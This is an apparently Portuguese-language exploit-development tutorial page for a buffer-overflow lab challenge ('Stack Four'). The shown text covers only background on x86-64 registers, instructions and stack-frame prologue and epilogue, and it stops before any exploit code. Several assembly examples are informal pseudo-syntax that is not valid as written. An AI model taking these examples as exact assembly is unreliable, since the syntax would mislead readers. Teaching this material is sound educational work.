<!DOCTYPE HTML>
<html lang="pt-br" class="sidebar-visible no-js ayu">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>Stack Four - Um Livrinho Sobre Exploit Dev</title>
        <!-- Custom HTML head -->
        

        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff" />

        <link rel="icon" href="../../favicon.svg">
        <link rel="shortcut icon" href="../../favicon.png">
        <link rel="stylesheet" href="../../css/variables.css">
        <link rel="stylesheet" href="../../css/general.css">
        <link rel="stylesheet" href="../../css/chrome.css">
        <link rel="stylesheet" href="../../css/print.css" media="print">
        <!-- Fonts -->
        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../fonts/fonts.css">
        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../highlight.css">
        <link rel="stylesheet" href="../../tomorrow-night.css">
        <link rel="stylesheet" href="../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->
    </head>
    <body>
        <!-- Provide site root to javascript -->
        <script type="text/javascript">
            var path_to_root = "../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
        </script>

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script type="text/javascript">
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script type="text/javascript">
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            var html = document.querySelector('html');
            html.classList.remove('no-js')
            html.classList.remove('ayu')
            html.classList.add(theme);
            html.classList.add('js');
        </script>

        <!-- Hide / unhide sidebar before it is displayed -->
        <script type="text/javascript">
            var html = document.querySelector('html');
            var sidebar = 'hidden';
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            }
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <div class="sidebar-scrollbox">
                <ol class="chapter"><li class="chapter-item affix "><a href="../../mapa.html">Mapa</a></li><li class="spacer"></li><li class="chapter-item "><a href="../../stack/stack.html">Stack</a></li><li class="chapter-item expanded "><a href="../../stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item expanded "><a href="../../stack/phoenix/StackFour.html" class="active">Stack Four</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><a href="../../stack/mitigacoes.html">Mitiga√ß√µes</a></li><li class="chapter-item "><a href="../../stack/ret2libc.html">Ret2LibC</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li><li class="chapter-item "><div>Avan√ßado: M√∫ltiplos ret2libc</div></li></ol></li><li class="chapter-item "><a href="../../stack/gotplt.html">GOT e PLT</a></li><li class="chapter-item "><a href="../../stack/rop/intro.html">ROP</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/primitivos.html">Primitivos</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/ROPE/dump.html">ROPE</a></li></ol></li><li class="chapter-item "><div>Pivot</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/ROPE/pivot.html">ROPE: pivot</a></li></ol></li><li class="chapter-item "><a href="../../stack/rop/SROP/SROP.html">SROP</a></li><li class="chapter-item "><a href="../../stack/rop/ret2dlresolve.html">ret2dl-resolve</a></li></ol></li><li class="chapter-item "><a href="../../stack/ASLR/aslr.html">ASLR</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/ASLR/corromperGOT.html">Corromper GOT</a></li><li class="chapter-item "><a href="../../stack/ASLR/ret2plt.html">ret2plt</a></li><li class="chapter-item "><a href="../../stack/ASLR/brute32.html">Bruteforce</a></li></ol></li><li class="chapter-item "><div>Canary</div></li><li class="chapter-item "><div>PIE</div></li><li class="chapter-item "><a href="../../stack/leakAll.html">Extra: Leakando tudo</a></li><li class="spacer"></li><li class="chapter-item "><a href="../../heap/heap.html">Heap</a></li><li class="chapter-item "><a href="../../heap/intro.html">Intro</a></li><li class="chapter-item "><div>Bugs Gerais</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><div>UAF</div><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/geral/uaf/heap-two.html">Exploit Education: Heap Two</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../heap/relacionados/relacionados.html">Conceitos Relacionados</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/relacionados/io_list_all.html">_IO_list_all</a></li></ol></li><li class="chapter-item "><a href="../../heap/malloc/intro.html">Atacando Malloc</a><a class="toggle"><div>‚ù±</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/malloc/teoria.html">Teoria</a></li><li class="chapter-item "><a href="../../heap/malloc/fastbinsDup.html">Fastbins Dup</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfForce.html">House of Force</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfSpirit.html">House of Spirit</a></li><li class="chapter-item "><a href="../../heap/malloc/unsafeUnlink.html">Unsafe Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/safeUnlink.html">Safe Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfEinherjar.html">House of Einherjar</a></li><li class="chapter-item "><a href="../../heap/malloc/GooglePoisonNull.html">Google Poison Null Byte</a></li><li class="chapter-item "><a href="../../heap/malloc/PartialUnlink.html">Unsorted bins: Partial Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfOrange.html">House of Orange</a></li><li class="chapter-item "><a href="../../heap/malloc/comboFastUnsorted.html">Combo: Fast+Unsorted</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfLore.html">House of Lore</a></li><li class="chapter-item "><div>House of Rust</div></li><li class="chapter-item "><div>House of Corrosion</div></li></ol></li><li class="chapter-item "><div>Extra</div></li><li class="spacer"></li><li class="chapter-item "><a href="../../linux_internals/linux.html">Linux Internals</a></li><li class="chapter-item "><a href="../../linux_internals/prerequisitos.html">Prerequisitos</a></li></ol>
            </div>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky bordered">
                    <div class="left-buttons">
                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </button>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>

                    <div class="right-buttons">
                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>
                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
                            <i id="git-repository-button" class="fa fa-github"></i>
                        </a>
                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>
                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script type="text/javascript">
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <ul>
<li><a href="#-objetivo">üéØ Objetivo</a></li>
<li><a href="#-conhecimento-preliminar">üõ∏ Conhecimento preliminar</a>
<ul>
<li><a href="#-assembly">ü§ñ Assembly</a>
<ul>
<li><a href="#-register-registos--registadores">üì¶ Register (Registos / Registadores)</a>
<ul>
<li><a href="#-general-purpose-registers-gpr--registo-de-prop%C3%B3sito-geral-">üåç General Purpose Registers (GPR) ( Registo de Prop√≥sito Geral )</a></li>
<li><a href="#-address-register--armazenam-endere%C3%A7os-da-stack-">üí´ Address Register ( armazenam endere√ßos da stack )</a></li>
<li><a href="#-rflag">üèÅ RFLAG</a></li>
<li><a href="#-ap%C3%AAndice---curiosidade--nomenclatura-hist%C3%B3rica">üß† Ap√™ndice - Curiosidade : Nomenclatura hist√≥rica</a></li>
</ul>
</li>
<li><a href="#-instru%C3%A7%C3%B5es">‚ö° Instru√ß√µes</a></li>
<li><a href="#-fun%C3%A7%C3%B5es-pr%C3%B3logo-e-ep%C3%ADlogo">ü¶Ñ Fun√ß√µes, Pr√≥logo e Ep√≠logo</a>
<ul>
<li><a href="#-revis%C3%A3o">‚òï Revis√£o</a></li>
<li><a href="#%EF%B8%8F-stack-frame--moldura-da-stack-">üñºÔ∏è Stack Frame ( Moldura da Stack )</a></li>
<li><a href="#-pr%C3%B3logo">üîí Pr√≥logo</a>
<ul>
<li><a href="#se-a-fun%C3%A7%C3%A3o-receber-argumentos-salvar-eles">Se a fun√ß√£o receber argumentos, salvar eles</a></li>
</ul>
</li>
<li><a href="#salvar-o-frame-atual">Salvar o frame atual</a></li>
<li><a href="#criar-novo-frame">Criar novo frame</a></li>
<li><a href="#-ep%C3%ADlogo">üîë Ep√≠logo</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><a href="#-caso-voc%C3%AA-tenha-viajado-o-que-voc%C3%AA-precisa-saber">üåç Caso voc√™ tenha viajado, o que voc√™ precisa saber</a></li>
<li><a href="#-exploit">üî• Exploit</a>
<ul>
<li><a href="#-analisar-o-programa">üî¨ Analisar o programa</a></li>
<li><a href="#%EF%B8%8F-o-compilador-adicionou-coisa">‚ÅâÔ∏è O compilador adicionou coisa???</a></li>
<li><a href="#-encontrar-endere%C3%A7o-de-complete_level">üè† Encontrar endere√ßo de complete_level</a></li>
</ul>
</li>
<li><a href="#-solu%C3%A7%C3%A3o">üí´ Solu√ß√£o</a></li>
</ul>
<h1 id="-objetivo"><a class="header" href="#-objetivo">üéØ Objetivo</a></h1>
<p>O buffer overflow (<code>BOF</code>) vai nos permitir alterar o saved return pointer (<code>SRP</code>) e redirecionar a execu√ß√£o do programa.</p>
<p>Esse desafio est√° nos preparando para o pr√≥ximo, no qual nos redirecionaremos a execu√ß√£o para o nosso pr√≥prio c√≥digo, e teremos um exploit de verdade! :D</p>
<p>Esse tipo de exploit era vi√°vel nos anos 90, quando mecanismos de prote√ß√£o n√£o existiam. Por isso √© chamado de buffer overflow cl√°ssico (ou <code>SRP BOF</code>, 
caso voc√™ goste de siglas)! :D</p>
<p>Se voc√™ souber ingl√™s, vale a pena dar uma lida nesse post de 1996 no Phrack: <a href="http://phrack.org/issues/49/14.html">Smashing The Stack For Fun And Profit</a> !</p>
<h1 id="-conhecimento-preliminar"><a class="header" href="#-conhecimento-preliminar">üõ∏ Conhecimento preliminar</a></h1>
<p>Se tem uma se√ß√£o inteira dedicada a conhecimento preliminar, eu posso te garantir que vai ser BASTANTE ! Verifique que o cinto de seguran√ßa est√° firme e travado,
mantenha as m√£os, pernas e canecas de caf√© dentro do ve√≠culo durante todo o percurso!</p>
<p>3...2...1....</p>
<h2 id="-assembly"><a class="header" href="#-assembly">ü§ñ Assembly</a></h2>
<p>Recursos adicionais: <br />
<a href="https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf&amp;ved=2ahUKEwiPvJn2xvrsAhXIILkGHdA4BNUQFjAAegQIARAB&amp;usg=AOvVaw384MVXQDBtyM1pPW3LeZrW">x64 Cheat Sheet - PDF</a> <br />
<a href="https://cs61.seas.harvard.edu/site/2018/Asm1/">Harvard CS61</a> <br />
<a href="https://en.m.wikipedia.org/wiki/Processor_register">Wikipedia Registers</a> <br />
<a href="https://www.tutorialspoint.com/general-purpose-registers-in-8086-microprocessor#:%7E:text=The%20general%20purpose%20registers%20are,has%20eight%20general%20purpose%20registers.&amp;text=This%20is%20the%20accumulator.,into%20two%208%2Dbit%20registers">GPR in 8086</a><br />
<a href="https://mentebinaria.gitbook.io/engenharia-reversa/assembly/registradores">Registadores - Introdu√ß√£o Engenharia Reversa</a> </p>
<p>Eu pretendo fazer uma serie de tutorias dedicada √† assembly (ASM), por√©m isso √© para o futuro...</p>
<p>Eu vou usar sintaxe intel, pq √© a melhor e se algu√©m te disser o contr√°rio, a pessoa ta mentindo &gt;:( !!!!</p>
<blockquote>
<p>ASM √© uma representa√ß√£o leg√≠vel dos 0s e 1s das instru√ß√µes do computador.
Ela pode ser transformada em machine code (c√≥digo de maquina, os 0s e 1s) usando uma ferramenta chamada assembler!</p>
</blockquote>
<p>Ent√£o como voc√™ pode imaginar, √© bem complicado, e a minha maneira de explicar pode n√£o funcionar para voc√™... Ent√£o vai com calma, le de outras fontes, assiste 
videos,... vai demorar um bom tempo ate ficar intuitivo, e ta tudo bem com isso :) vai no seu ritmo</p>
<h3 id="-register-registos--registadores"><a class="header" href="#-register-registos--registadores">üì¶ Register (Registos / Registadores)</a></h3>
<blockquote>
<p>Registers s√£o peda√ßos de mem√≥ria que ficam dentro do chip do processador,
semelhante a mem√≥ria RAM, por√©m extremamente r√°pidos e pequenos.</p>
</blockquote>
<p>O seu tamanho √© um dos determinantes da arquitetura (32 bits = register de
4 bytes, 64 bits = register de 8 bytes)</p>
<p>Esses registers s√£o semelhantes √† vari√°veis, no sentido que
armazenam valores, podem ser alterados e lidos.</p>
<h4 id="-general-purpose-registers-gpr--registo-de-prop√≥sito-geral-"><a class="header" href="#-general-purpose-registers-gpr--registo-de-prop√≥sito-geral-">üåç General Purpose Registers (GPR) ( Registo de Prop√≥sito Geral )</a></h4>
<p>Obs: muitos desses podem ser divididos em 2 partes, com metade do tamanho original. Nesse caso, se adiciona o sufixo H (High, A parte de cima) e L (Low, A parte de baixo). </p>
<blockquote>
<p>Por exemplo: AX (16 bits, endere√ßos: 0 a 15) (uma vers√£o antiga do RAX) pode ser dividido em AL (8 bits, do 0 ao 7) e AH (8 bits, do 8 ao 15).</p>
</blockquote>
<p>O prop√≥sito deles historicamente costumava ser, mas n√£o exclusivamente era:</p>
<pre><code class="language-x86asm">RAX Acumulador   -&gt; Usado para opera√ß√µes_l√≥gicas ou aritm√©ticas 
RBX              -&gt; Pointer para dados
RCX Contagem     -&gt; Usado em loops e outras opera√ß√µes_c√≠clicas 
RDX Dados        -&gt; Multiplica√ß√£o, input/output
R8 a 15          -&gt; voc√™ s√≥ precisa saber que eles existem
</code></pre>
<p>Alem disso, s√£o usados para passar os argumentos para fun√ß√µes (explica√ß√£o em breve)</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1¬∫ par√¢metro)
RSI (2¬∫ par√¢metro)
RDX (3¬∫ par√¢metro)
...
</code></pre>
<p>Para os nossos prop√≥sitos, √© mais vantajoso considerar que eles s√≥ servem para 
armazenar valores e passar argumentos</p>
<h4 id="-address-register--armazenam-endere√ßos-da-stack-"><a class="header" href="#-address-register--armazenam-endere√ßos-da-stack-">üí´ Address Register ( armazenam endere√ßos da stack )</a></h4>
<pre><code class="language-x86asm">RSP Stack Pointer       -&gt; Aponta para o topo da stack
RBP Base Pointer        -&gt; Aponta para a base da stack
RIP Instruction Pointer -&gt; Aponta para a instru√ß√£o 
								que est√° sendo executada 
</code></pre>
<h4 id="-rflag"><a class="header" href="#-rflag">üèÅ RFLAG</a></h4>
<p>O register RFLAG armazena flags: sinais que indicam resultados de opera√ß√µes passadas.
Esses sinais s√£o 1 bit (0 ou 1)</p>
<pre><code>Exemplos:

Posi√ß√£o    Nome         Descri√ß√£o 
0          Carry         Resultado estourou o limite de um inteiro
								sem sinal (o &quot;vai-um&quot; da matem√°tica)
6          Zero          A opera√ß√£o resultou em 0
11         Overflow      Estourou o limite de um inteiro com sinal
</code></pre>
<h4 id="-ap√™ndice---curiosidade--nomenclatura-hist√≥rica"><a class="header" href="#-ap√™ndice---curiosidade--nomenclatura-hist√≥rica">üß† Ap√™ndice - Curiosidade : Nomenclatura hist√≥rica</a></h4>
<p><img src="./img/registers.jpeg" alt="Imagem mostrando os registers" /> <br />
Eu vou usar o RAX como exemplo!</p>
<pre><code class="language-x86asm">Em computadores 8 bits, ele era chamado A (Acumulador)
Em computadores 16 bits, ele era chamado AX (Acumulador eXtendido ) 
Em computadores 32 bits, ele era chamado EAX e tem o tamanho de 2 AX
Em computadores 64 bits, ele √© chamado RAX e tem o tamanho de 2 EAX

Para prop√≥sitos de retro-compatibilidade, nos ainda podemos usar, 
por exemplo, EAX em um computador 64 bits !
Por tr√°s das cenas, o computador interpreta EAX como a segunda metade do RAX

Ent√£o n√£o estranhe caso algu√©m fale de EIP numa
arquitetura x64, pois na linguagem informal n√£o faz diferen√ßa

Mas caso voc√™ v√° analisar o register em um debugger, a diferen√ßa importa :D
</code></pre>
<h3 id="-instru√ß√µes"><a class="header" href="#-instru√ß√µes">‚ö° Instru√ß√µes</a></h3>
<blockquote>
<p>Obs: os registers foram usados aleatoriamente, pois seu prop√≥sito na realidade n√£o √© relevante para a explica√ß√£o !</p>
</blockquote>
<p>As instru√ß√µes s√£o o que o processador executa, por exemplo</p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adi√ß√£o 4 + 1 = 5
</code></pre>
<p>Na sintaxe intel, o &quot;alvo&quot; da opera√ß√£o vem primeiro e o &quot;par√¢metro&quot; depois</p>
<p>Caso os dois argumentos da instru√ß√£o sejam valores, a opera√ß√£o executara normalmente</p>
<p>Caso o <strong>alvo</strong> seja um <strong>register</strong>, o <strong>resultado</strong> da opera√ß√£o ser√° salvo nele </p>
<pre><code class="language-x86asm">add 0x4 0x1     -&gt; adi√ß√£o 4 + 1 = 5
add rbp 0x10    -&gt; rbp  vira  rbp + 0x10
add rbp 0x22    -&gt; Adiciona 0x22 ao rbp 
</code></pre>
<pre><code class="language-x86asm">sub 0x4 0x1     -&gt; subtra√ß√£o 4 - 1 = 3
                 Caso fosse ao contr√°rio a ordem &quot;alvo&quot; &quot;par√¢metro&quot;,
                 o resultado seria `-3` !
                 
sub rbp 0x10    -&gt; rbp  vira  rbp - 0x10
sub rsp 0x10    -&gt; Subtrai 0x10 de rsp
</code></pre>
<p>Algumas outras instru√ß√µes que ser√£o importantes</p>
<pre><code class="language-x86asm">push -&gt; Empurra o valor pro topo da Stack

pop  -&gt; Tira o valor no topo da Stack e salva no alvo
     |---&gt; pop      -&gt; S√≥ remove o valor no topo da Stack
     |---&gt; pop rbp  -&gt; Remove o valor do topo e salva em rbp
      
mov  -&gt; Move o valor do par√¢metro para o alvo
     |---&gt; mov rbx 0x10   -&gt; O valor de rbx vira 0x10
     |---&gt; mov rbx rax    -&gt; O valor de rbx vira o valor de rax
     |---&gt; mov rax rbx    -&gt; O valor de rax vira o valor de rbx

Usadas no ep√≠logo ( explicadas em breve )
           ret     -&gt; retorna da fun√ß√£o ( em ess√™ncia √© s√≥ um &quot;pop rip&quot; )
           leave -&gt; restaura o stack frame anterior ( mov rsp rbp ; pop rbp )

xor, and, ......  -&gt; Operadores l√≥gicos, t√™m o mesmo comportamento de sub e add
                  |---&gt; and rbp 0x10   -&gt; rbp  vira  rbp &amp; 0x10
                  |---&gt; xor rsp 0x10   -&gt; rsp  vira  rsp ^ 0x10

Jumps/Pulos
jmp 0x00001234 -&gt; Move o RIP para aquela localiza√ß√£o incondicionalmente,
			equivalente a um GOTO

test rax 0x1 ; jmpEQ 0x00001234 -&gt; jmp equal
             |---&gt; Compara os valores; Se forem iguais da o jump
			 (normalmente usado em conjunto com a ZERO_FLAG)

jmple  -&gt; jmp less or equal   -&gt; Menor ou igual   ‚â§
jmpge -&gt; jmp greater or equal -&gt; Maior ou igual   ‚â•
</code></pre>
<p>Caso vc n√£o saiba os operadores l√≥gicos: <a href="https://pt.wikipedia.org/wiki/Operador_l%C3%B3gico">Wikipedia Operador L√≥gico</a></p>
<h3 id="-fun√ß√µes-pr√≥logo-e-ep√≠logo"><a class="header" href="#-fun√ß√µes-pr√≥logo-e-ep√≠logo">ü¶Ñ Fun√ß√µes, Pr√≥logo e Ep√≠logo</a></h3>
<p>Agora t√° na hora de aprender <strong>realmente</strong> como essa tal de stack funciona, ent√£o √© bom dar uma revisada, n√©?</p>
<h4 id="-revis√£o"><a class="header" href="#-revis√£o">‚òï Revis√£o</a></h4>
<pre><code>- A stack √© como uma pilha de pratos: √∫ltimo a entrar, primeiro a sair (LIFO)
- Ela cresce para valores menores: 
    - A mem√≥ria √© representada de cabe√ßa pra baixo!
    - A base fica em um endere√ßo maior (parte de baixo)
    - O topo fica em um endere√ßo menor (parte de cima)
    - Portanto, a stack cresce em dire√ß√£o √† valores menores :D 

</code></pre>
<h4 id="-stack-frame--moldura-da-stack-"><a class="header" href="#-stack-frame--moldura-da-stack-">üñºÔ∏è Stack Frame ( Moldura da Stack )</a></h4>
<p>Voc√™ se lembra do RBP e RSP la da parte dos register? Eles ficam importantes agora! :D</p>
<p>O rbp indica a base da stack, e rsp o topo.</p>
<p>A regi√£o entre os dois √© chamada de stack frame: um peda√ßo da stack :D</p>
<p>A stack como um todo possui v√°rios stack frames, por√©m s√≥ um est√° ativo por vez (o indicado pelo rbp/rsp).</p>
<p>Para poder criar um novo ou destruir um antigo, existem procedimentos chamados Pr√≥logo e Ep√≠logo, respectivamente.</p>
<blockquote>
<p>Obs: Quando voc√™ muda o tamanho da stack por push/pop, o RSP se ajusta automaticamente </p>
</blockquote>
<p>Quando chamamos uma <strong>fun√ß√£o()</strong>, precisamos criar um frame novo para ela por meio de um Pr√≥logo, e salvar o endere√ßo do frame atual. Ao retornar, esse frame ser√° destru√≠do com um Ep√≠logo e o antigo ser√° restaurado !</p>
<p>Para a explica√ß√£o, vamos usar o seguinte pseudo-programa:</p>
<pre><code class="language-C">Fn print_dois(x, y) {
    print(x)
    print(y)

    return
}
Fn main() {
    x = &quot;Ola! :D&quot;
    y = &quot;Assembly √© legal&quot;

    print_dois(x, y)

    return
}
</code></pre>
<p>Agora vamos executar <strong>main()</strong>, <strong>x</strong> e <strong>y</strong> s√£o definidas e nos j√° sabemos como isso funciona, agora vamos chamar a fun√ß√£o, que √© aonde a m√°gica acontece !</p>
<h4 id="-pr√≥logo"><a class="header" href="#-pr√≥logo">üîí Pr√≥logo</a></h4>
<ul>
<li>Se a fun√ß√£o receber argumentos, passar eles
Chamar a fun√ß√£o </li>
<li>Salvar o frame atual</li>
<li>Criar novo frame
Executar a fun√ß√£o</li>
</ul>
<h5 id="se-a-fun√ß√£o-receber-argumentos-salvar-eles"><a class="header" href="#se-a-fun√ß√£o-receber-argumentos-salvar-eles">Se a fun√ß√£o receber argumentos, salvar eles</a></h5>
<p>Algumas arquiteturas passam os argumentos pela stack, salvando-os na stack na ordem inversa:</p>
<pre><code class="language-x86asm">(x, y)
push y
push x
</code></pre>
<p>Mas comumente, os argumentos s√£o passados pelos registers:</p>
<pre><code class="language-x86asm">RAX (Valor retornado)
RDI (1¬∫ par√¢metro)
RSI (2¬∫ par√¢metro)
RDX (3¬∫ par√¢metro)
...
</code></pre>
<blockquote>
<p>Caso <strong>main()</strong> use um desses registers para armazenar dados para uso futuro, vai ser necess√°rio dar um push neles, e restaura-los no epilogo </p>
</blockquote>
<h4 id="salvar-o-frame-atual"><a class="header" href="#salvar-o-frame-atual">Salvar o frame atual</a></h4>
<pre><code class="language-x86asm">push RIP + 0x4 ; salva o RIP na stack, por√©m n√£o o valor atual,
	       ; e sim o endere√ßo da pr√≥xima instru√ß√£o 
push RBP       ; salva o RBP
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">rbp main            &lt;- RSP   -
rip main                     | Frame de
....                         | main()
ret de main         &lt;- RBP   -
</code></pre>
<h4 id="criar-novo-frame"><a class="header" href="#criar-novo-frame">Criar novo frame</a></h4>
<p>Agora, para criar um novo frame, precisamos subir o rbp at√© o rsp</p>
<pre><code class="language-x86asm">mov rbp rsp ; Move o valor de rsp para rbp!
            ; Ou melhor : rbp &quot;anda&quot; at√© o rsp
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">rbp main    &lt;- RSP  e RBP apontam para a mesma localiza√ß√£o
rip main                   
... stack frame de main omitido           
</code></pre>
<p>Agora, precisamos <strong>subtrair</strong> de RSP para alocar espa√ßo na mem√≥ria para essa fun√ß√£o </p>
<blockquote>
<p>A stack cresce para valores menores :)</p>
</blockquote>
<pre><code class="language-x86asm">sub rsp - 0x20 ; vamos supor que, para esse exemplo, a fun√ß√£o precisa de 32 bytes.
               ; Portanto, vamos subtrair 32 bytes de RSP, para faze-lo &quot;subir&quot;
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Vari√°veis de print_dois  |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
...              
</code></pre>
<p>Com esse m√©todo de chamar fun√ß√£o, n√£o importa a localiza√ß√£o da mem√≥ria de quando a fun√ß√£o foi chamada, ela sempre vai executar da mesma maneira</p>
<blockquote>
<p>Esse processo pode ocorrer muitas vezes caso uma fun√ß√£o chame outra, no nosso exemplo, um novo frame seria criado para <strong>print()</strong>, print seria executada,
e o frame destru√≠do ao retornar. Apos <strong>print()</strong> retornar, <strong>print_dois continuara a execu√ß√£o normalmente! :)</strong></p>
</blockquote>
<pre><code class="language-x86asm">O prologo ent√£o pode ser resumido em

salvar vars
call
  push rip
  push rbp
  mov rbp rsp
  sub rsp 0x1234
  executar a fun√ß√£o
</code></pre>
<h4 id="-ep√≠logo"><a class="header" href="#-ep√≠logo">üîë Ep√≠logo</a></h4>
<p>O epilogo √© bem mais simples que o prologo:</p>
<pre><code>- Devolver memoria e restaurar RBP    -&gt; leave   
- Restaurar RIP  e retornar           -&gt; ret
</code></pre>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...          &lt;- RSP      -
Instru√ß√µes               |
...                      | Frame de
...                      | print_dois()
rbp main     &lt;- RBP      -
rip main                   
            
</code></pre>
<p><strong>leave</strong></p>
<p>Para devolver a memoria, precisamos mover RSP &quot;para baixo: basta dar um <code>mov rsp rbp</code> (&quot;andar&quot; rsp at√© o rbp)</p>
<p>Atualmente, a stack est√° assim</p>
<pre><code class="language-x86asm">...                    
Vari√°veis print dois   A regi√£o n√£o √© apagada, pois consumiria processamento a toa!
...         O valores ficam largados l√° at√© uma nova fun√ß√£o escrever por cima deles..
...         Por isso que, ao analisar a stack, as vezes vemos &quot;lixo&quot; aleat√≥rio
...         Eles pode ser ignorado pois nem est√° mais na stack
                          
rbp main  &lt;- RBP e RSP - O topo da stack
rip main                                
</code></pre>
<p>Em seguida, vamos restaurar o rbp de main <code>pop rbp</code> 
(remover o valor no topo da stack (ver acima por referencia), e coloca-lo no alvo: <strong>rbp</strong>)</p>
<pre><code class="language-x86asm">--- omitido ---
rip main      &lt;- RSP   (lembrando que RSP se ajusta automaticamente com push/pop)
...
... main
call print_dois
proxima instru√ß√£o
... resto de main
ret de main   &lt;- RBP
</code></pre>
<p><strong>ret (return)</strong>
ret vai restaurar o EIP de main com um <code>pop rip</code></p>
<pre><code class="language-x86asm">...
...resto de main  &lt;- RSP
call print_dois
proxima instru√ß√£o &lt;- RIP
